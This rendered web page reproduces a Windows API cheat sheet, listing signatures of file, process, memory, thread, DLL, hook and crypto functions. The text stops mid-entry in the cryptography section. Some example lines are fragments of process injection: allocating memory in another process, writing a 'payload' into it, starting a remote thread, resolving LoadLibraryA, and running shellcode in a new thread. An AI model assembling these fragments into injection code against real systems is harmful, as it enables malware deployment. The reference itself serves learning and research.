<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Windows APIÁ§∫‰æãÂ§ßÂÖ® - Share Docs</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Table of Contents", url: "#_top", children: [
          ]},
          {title: "Windows API Function Calls", url: "#windows-api-function-calls", children: [
              {title: "File Operations", url: "#file-operations" },
              {title: "Process Management", url: "#process-management" },
              {title: "Memory Management", url: "#memory-management" },
              {title: "Thread Management", url: "#thread-management" },
              {title: "Dynamic-Link Library (DLL) Management", url: "#dynamic-link-library-dll-management" },
              {title: "Synchronization", url: "#synchronization" },
              {title: "Interprocess Communication", url: "#interprocess-communication" },
              {title: "Windows Hooks", url: "#windows-hooks" },
              {title: "Cryptography", url: "#cryptography" },
              {title: "Debugging", url: "#debugging" },
              {title: "Winsock", url: "#winsock" },
              {title: "Registry Operations", url: "#registry-operations" },
              {title: "Error Handling", url: "#error-handling" },
              {title: "Resource Management", url: "#resource-management" },
          ]},
          {title: "Unicode String Functions", url: "#unicode-string-functions", children: [
              {title: "String Length", url: "#string-length" },
              {title: "String Copy", url: "#string-copy" },
              {title: "String Concatenation", url: "#string-concatenation" },
              {title: "String Comparison", url: "#string-comparison" },
              {title: "String Search", url: "#string-search" },
              {title: "Character Classification and Conversion", url: "#character-classification-and-conversion" },
          ]},
          {title: "Win32 Structs Cheat Sheet", url: "#win32-structs-cheat-sheet", children: [
              {title: "Common Structs", url: "#common-structs" },
              {title: "Win32 Sockets Structs Cheat Sheet (winsock.h)", url: "#win32-sockets-structs-cheat-sheet-winsockh" },
              {title: "Win32 Sockets Structs Cheat Sheet (winsock2.h)", url: "#win32-sockets-structs-cheat-sheet-winsock2h" },
              {title: "Win32 Sockets Structs Cheat Sheet (ws2def.h)", url: "#win32-sockets-structs-cheat-sheet-ws2defh" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-link">
        Crackmes.oneÁªÉ‰π†
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
        LinuxÂÆâÂÖ®Á¨îËÆ∞
      </a>
    </div>
    
  </div>

    

    <div align="center">

  ![API CheatSheets](https://github.com/snowcra5h/windows-api-function-cheatsheets/assets/90065760/f20d276b-68be-481f-a17e-5c6fa4960331)

</div>

<div align="center">

# Windows API Function Cheatsheets
<h3>Contact Us</h3>

üå®Ô∏è Snowcrash: [snowcra5h@icloud.com](mailto:snowcra5h@icloud.com)
üïµÔ∏è‚Äç‚ôÇÔ∏è Plackyhacker: [Plackyhacker@proton.me](mailto:Plackyhacker@proton.me)
 </div>

<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#windows-api-function-cheatsheets">Windows API Function Cheatsheets</a><ul>
<li><a href="#file-operations">File Operations</a></li>
<li><a href="#process-management">Process Management</a></li>
<li><a href="#memory-management">Memory Management</a></li>
<li><a href="#thread-management">Thread Management</a></li>
<li><a href="#dynamic-link-library-dll-management">Dynamic-Link Library (DLL) Management</a></li>
<li><a href="#synchronization">Synchronization</a></li>
<li><a href="#interprocess-communication">Interprocess Communication</a></li>
<li><a href="#windows-hooks">Windows Hooks</a></li>
<li><a href="#cryptography">Cryptography</a></li>
<li><a href="#debugging">Debugging</a></li>
<li><a href="#winsock">Winsock</a></li>
<li><a href="#registry-operations">Registry Operations</a></li>
<li><a href="#error-handling">Error Handling</a></li>
<li><a href="#resource-management">Resource Management</a></li>
</ul>
</li>
<li><a href="#unicode-string-functions">Unicode String Functions</a><ul>
<li><a href="#string-length">String Length</a></li>
<li><a href="#string-copy">String Copy</a></li>
<li><a href="#string-concatenation">String Concatenation</a></li>
<li><a href="#string-comparison">String Comparison</a></li>
<li><a href="#string-search">String Search</a></li>
<li><a href="#character-classification-and-conversion">Character Classification and Conversion</a></li>
</ul>
</li>
<li><a href="#win32-structs-cheat-sheet">Win32 Structs Cheat Sheet</a><ul>
<li><a href="#common-structs">Common Structs</a></li>
<li><a href="#win32-sockets-structs-cheat-sheet-winsockh">Win32 Sockets Structs Cheat Sheet (winsock.h)</a></li>
<li><a href="#win32-sockets-structs-cheat-sheet-winsock2h">Win32 Sockets Structs Cheat Sheet (winsock2.h)</a></li>
<li><a href="#win32-sockets-structs-cheat-sheet-ws2defh">Win32 Sockets Structs Cheat Sheet (ws2def.h)</a></li>
</ul>
</li>
</ul>
<h2 id="windows-api-function-calls">Windows API Function Calls</h2>
<h3 id="file-operations">File Operations</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">CreateFile</a></p>
<pre><code class="language-c">HANDLE CreateFile(
  LPCTSTR lpFileName,
  DWORD dwDesiredAccess,
  DWORD dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD dwCreationDisposition,
  DWORD dwFlagsAndAttributes,
  HANDLE hTemplateFile
); // Opens an existing file or creates a new file.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile">ReadFile</a></p>
<pre><code class="language-c">BOOL ReadFile(
  HANDLE hFile,
  LPVOID lpBuffer,
  DWORD nNumberOfBytesToRead,
  LPDWORD lpNumberOfBytesRead,
  LPOVERLAPPED lpOverlapped
); // Reads data from the specified file.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile">WriteFile</a></p>
<pre><code class="language-c">BOOL WriteFile(
  HANDLE hFile,
  LPCVOID lpBuffer,
  DWORD nNumberOfBytesToWrite,
  LPDWORD lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
); // Writes data to the specified file.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle">CloseHandle</a></p>
<pre><code class="language-c">BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
</code></pre>
<h3 id="process-management">Process Management</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess</a></p>
<pre><code class="language-c">HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
); // Opens an existing local process object. e.g., try to open target process
</code></pre>
<pre><code class="language-c">hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a></p>
<pre><code class="language-c">HANDLE CreateProcess(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
); // The CreateProcess function creates a new process that runs independently of the creating process. For simplicity, this relationship is called a parent-child relationship.
</code></pre>
<pre><code class="language-c">// Start the child process
// No module name (use command line), Command line, Process handle not inheritable, Thread handle not inheritable, Set handle inheritance to FALSE, No creation flags, Use parent's environment block, Use parent's starting directory, Pointer to STARTUPINFO structure, Pointer to PROCESS_INFORMATION structure
CreateProcess( NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi); 
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a></p>
<pre><code class="language-c">UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
); // Runs the specified application.
</code></pre>
<pre><code class="language-c">result = WinExec(L&quot;C:\\Windows\\System32\\cmd.exe&quot;, SW_SHOWNORMAL);
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess">TerminateProcess</a></p>
<pre><code class="language-c">BOOL TerminateProcess(
  HANDLE hProcess,
  UINT uExitCode
); // Terminates the specified process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-exitwindowsex">ExitWindowsEx</a></p>
<pre><code class="language-c">BOOL ExitWindowsEx(
  [in] UINT  uFlags,
  [in] DWORD dwReason
); // Logs off the interactive user, shuts down the system, or shuts down and restarts the system.
</code></pre>
<pre><code class="language-c">bResult = ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION);
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a></p>
<pre><code class="language-c">HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
); // used to obtain information about processes and threads running on a Windows system.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first">Process32First</a></p>
<pre><code class="language-c">BOOL Process32First(
  [in]      HANDLE           hSnapshot,
  [in, out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the first process encountered in a system snapshot, which is typically taken using the CreateToolhelp32Snapshot function.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next">Process32Next</a></p>
<pre><code class="language-c">BOOL Process32Next(
  [in]  HANDLE           hSnapshot,
  [out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the next process in a system snapshot after Process32First has been called. This function is typically used in a loop to enumerate all processes captured in a snapshot taken using the CreateToolhelp32Snapshot function.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></p>
<pre><code class="language-c">BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
); // Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.
</code></pre>
<pre><code class="language-c">WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); // pRemoteCode from VirtualAllocEx
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory">ReadProcessMemory</a></p>
<pre><code class="language-c">BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
); // ReadProcessMemory copies the data in the specified address range from the address space of the specified process into the specified buffer of the current process.
</code></pre>
<pre><code class="language-c">bResult = ReadProcessMemory(pHandle, (void*)baseAddress, &amp;address, sizeof(address), 0);
</code></pre>
<h3 id="memory-management">Memory Management</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></p>
<pre><code class="language-c">LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,                // Shellcode must be between 0x1 and 0x10000 bytes (page size)
  DWORD flAllocationType,       // #define MEM_COMMIT 0x00001000
  DWORD flProtect               // #define PAGE_EXECUTE_READWRITE 0x00000040  
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></p>
<pre><code class="language-c">LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero.
</code></pre>
<pre><code class="language-c">pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree">VirtualFree</a></p>
<pre><code class="language-c">BOOL VirtualFree(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD dwFreeType
); // Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect function (memoryapi.h)</a></p>
<pre><code class="language-c">BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
); // Changes the protection on a region of committed pages in the virtual address space of the calling process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">RtlMoveMemory</a></p>
<pre><code class="language-c">VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
); // Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
</code></pre>
<h3 id="thread-management">Thread Management</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread</a></p>
<pre><code class="language-c">HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,         // A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle.
  [in]            SIZE_T                  dwStackSize,                // The initial size of the stack, in bytes.
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,             // A pointer to the application-defined function of type LPTHREAD_START_ROUTINE
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,                // A pointer to a variable to be passed to the thread function.
  [in]            DWORD                   dwCreationFlags,            // The flags that control the creation of the thread.
  [out, optional] LPDWORD                 lpThreadId                  // A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.
); // Creates a thread to execute within the virtual address space of the calling process.
</code></pre>
<pre><code class="language-c">th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, 0);
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a></p>
<pre><code class="language-c">HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
); // Creates a thread that runs in the virtual address space of another process.
</code></pre>
<pre><code class="language-c">hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex">CreateRemoteThreadEx</a></p>
<pre><code class="language-c">HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
); // Creates a thread that runs in the virtual address space of another process and optionally specifies extended attributes such as processor group affinity.
   // See InitializeProcThreadAttributeList
</code></pre>
<pre><code class="language-c">hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, lpAttributeList, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread">ExitThread</a></p>
<pre><code class="language-c">VOID ExitThread(
  DWORD dwExitCode
); // Terminates the calling thread and returns the exit code to the operating system.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getexitcodethread">GetExitCodeThread</a></p>
<pre><code class="language-c">BOOL GetExitCodeThread(
  HANDLE hThread,
  LPDWORD lpExitCode
); // Retrieves the termination status of the specified thread.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a></p>
<pre><code class="language-c">DWORD ResumeThread(
  HANDLE hThread
); // Decrements a thread's suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread">SuspendThread</a></p>
<pre><code class="language-c">DWORD SuspendThread(
  HANDLE hThread
); // Suspends the specified thread.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminatethread">TerminateThread</a></p>
<pre><code class="language-c">BOOL TerminateThread(
  HANDLE hThread,
  DWORD dwExitCode
); // Terminates the specified thread.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle">CloseHandle</a></p>
<pre><code class="language-c">BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
</code></pre>
<h3 id="dynamic-link-library-dll-management">Dynamic-Link Library (DLL) Management</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibrary</a></p>
<pre><code class="language-c">HMODULE LoadLibrary(
  LPCTSTR lpFileName
); // Loads a dynamic-link library (DLL) module into the address space of the calling process.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryExA</a></p>
<pre><code class="language-c">HMODULE LoadLibraryExA(
  [in] LPCSTR lpLibFileName,
       HANDLE hFile,
  [in] DWORD  dwFlags
); // Loads the specified module into the address space of the calling process, with additional options.
</code></pre>
<pre><code class="language-c">HMODULE hModule = LoadLibraryExA(&quot;ws2_32.dll&quot;, NULL, LOAD_LIBRARY_SAFE_CURRENT_DIRS);
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">GetProcAddress</a></p>
<pre><code class="language-c">FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR lpProcName
); // Retrieves the address of an exported function or variable from the specified DLL.
</code></pre>
<pre><code class="language-c">pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(&quot;Kernel32.dll&quot;), &quot;LoadLibraryA&quot;);
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary">FreeLibrary</a></p>
<pre><code class="language-c">BOOL FreeLibrary(
  HMODULE hModule
); // Frees the loaded DLL module and, if necessary, decrements its reference count.
</code></pre>
<h3 id="synchronization">Synchronization</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutex</a></p>
<pre><code class="language-c">HANDLE CreateMutex(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL bInitialOwner,
  LPCTSTR lpName
); // Creates a named or unnamed mutex object.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createsemaphorea">CreateSemaphore</a></p>
<pre><code class="language-c">HANDLE CreateSemaphore(
  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,
  LONG lInitialCount,
  LONG lMaximumCount,
  LPCTSTR lpName
); // Creates a named or unnamed semaphore object.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasemutex">ReleaseMutex</a></p>
<pre><code class="language-c">BOOL ReleaseMutex(
  HANDLE hMutex
); // Releases ownership of the specified mutex object.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasesemaphore">ReleaseSemaphore</a></p>
<pre><code class="language-c">BOOL ReleaseSemaphore(
  HANDLE hSemaphore,
  LONG lReleaseCount,
  LPLONG lpPreviousCount
); // Increases the count of the specified semaphore object by a specified amount.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject</a></p>
<pre><code class="language-c">DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
); // Waits until the specified object is in the signaled state or the time-out interval elapses.
</code></pre>
<pre><code class="language-c">WaitForSingleObject(hThread, 500);
</code></pre>
<h3 id="interprocess-communication">Interprocess Communication</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe">CreatePipe</a></p>
<pre><code class="language-c">BOOL CreatePipe(
  PHANDLE hReadPipe,
  PHANDLE hWritePipe,
  LPSECURITY_ATTRIBUTES lpPipeAttributes,
  DWORD nSize
); // Creates an anonymous pipe and returns handles to the read and write ends of the pipe.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea">CreateNamedPipe</a></p>
<pre><code class="language-c">HANDLE CreateNamedPipe(
  LPCTSTR lpName,
  DWORD dwOpenMode,
  DWORD dwPipeMode,
  DWORD nMaxInstances,
  DWORD nOutBufferSize,
  DWORD nInBufferSize,
  DWORD nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
); // Creates a named pipe and returns a handle for subsequent pipe operations.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe">ConnectNamedPipe</a></p>
<pre><code class="language-c">BOOL ConnectNamedPipe(
  HANDLE hNamedPipe,
  LPOVERLAPPED lpOverlapped
); // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe">DisconnectNamedPipe</a></p>
<pre><code class="language-c">BOOL DisconnectNamedPipe(
  HANDLE hNamedPipe
); // Disconnects the server end of a named pipe instance from a client process.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga">CreateFileMapping</a></p>
<pre><code class="language-c">HANDLE CreateFileMapping(
  HANDLE hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD flProtect,
  DWORD dwMaximumSizeHigh,
  DWORD dwMaximumSizeLow,
  LPCTSTR lpName
); // Creates or opens a named or unnamed file mapping object for a specified file.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile">MapViewOfFile</a></p>
<pre><code class="language-c">LPVOID MapViewOfFile(
  HANDLE hFileMappingObject,
  DWORD dwDesiredAccess,
  DWORD dwFileOffsetHigh,
  DWORD dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
); // Maps a view of a file mapping into the address space of the calling process.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile">UnmapViewOfFile</a></p>
<pre><code class="language-c">BOOL UnmapViewOfFile(
  LPCVOID lpBaseAddress
); // Unmaps a mapped view of a file from the calling process's address space.
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle">CloseHandle</a></p>
<pre><code class="language-c">BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
</code></pre>
<h3 id="windows-hooks">Windows Hooks</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa">SetWindowsHookExA</a></p>
<pre><code class="language-c">HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
); // Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex">CallNextHookEx</a></p>
<pre><code class="language-c">LRESULT CallNextHookEx(
  [in, optional] HHOOK  hhk,
  [in]           int    nCode,
  [in]           WPARAM wParam,
  [in]           LPARAM lParam
); // Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex">UnhookWindowsHookEx</a></p>
<pre><code class="language-c">BOOL UnhookWindowsHookEx(
  [in] HHOOK hhk
); // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate">GetAsyncKeyState</a></p>
<pre><code class="language-c">SHORT GetAsyncKeyState(
  [in] int vKey
); // Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate">GetKeyState</a></p>
<pre><code class="language-c">SHORT GetKeyState(
  [in] int nVirtKey
); // Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off‚Äîalternating each time the key is pressed).
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate">GetKeyboardState</a></p>
<pre><code class="language-c">BOOL GetKeyboardState(
  [out] PBYTE lpKeyState
); // Copies the status of the 256 virtual keys to the specified buffer.
</code></pre>
<h3 id="cryptography">Cryptography</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptbinarytostringa">CryptBinaryToStringA</a></p>
<pre><code class="language-c">BOOL CryptBinaryToStringA(
  [in]            const BYTE *pbBinary,
  [in]            DWORD      cbBinary,
  [in]            DWORD      dwFlags,
  [out, optional] LPSTR      pszString,
  [in, out]       DWORD      *pcchString
); // The CryptBinaryToString function converts an array of bytes into a formatted string.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt">CryptDecrypt</a></p>
<pre><code class="language-c">BOOL CryptDecrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen
); // The CryptDecrypt function decrypts data previously encrypted by using the CryptEncrypt function.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt">CryptEncrypt</a></p>
<pre><code class="language-c">BOOL CryptEncrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen,
  [in]      DWORD      dwBufLen
); // The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecryptmessage">CryptDecryptMessage</a></p>
<pre><code class="language-c">BOOL CryptDecryptMessage(
  [in]                PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara,
